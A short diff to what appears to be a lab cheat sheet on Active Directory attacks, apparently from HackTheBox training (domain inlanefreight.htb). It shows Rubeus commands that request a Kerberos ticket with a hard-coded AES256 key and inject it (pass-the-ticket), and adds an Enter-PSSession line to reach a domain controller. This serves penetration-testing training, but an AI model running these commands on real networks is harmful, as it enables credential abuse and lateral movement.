@@ -230,5 +230,7 @@ Rubeus.exe createnetonly /program:"C:\Windows\System32\cmd.exe" /show
 Rubeus - Pass the Ticket for Lateral Movement
 ```
 Rubeus.exe asktgt /user:john /domain:inlanefreight.htb /aes256:9279bcbd40db957a0ed0d3856b2e67f9bb58e6dc7fc07207d0763ce2713f11dc /ptt
+powershell
+Enter-PSSession -ComputerName DC01
 ```
 
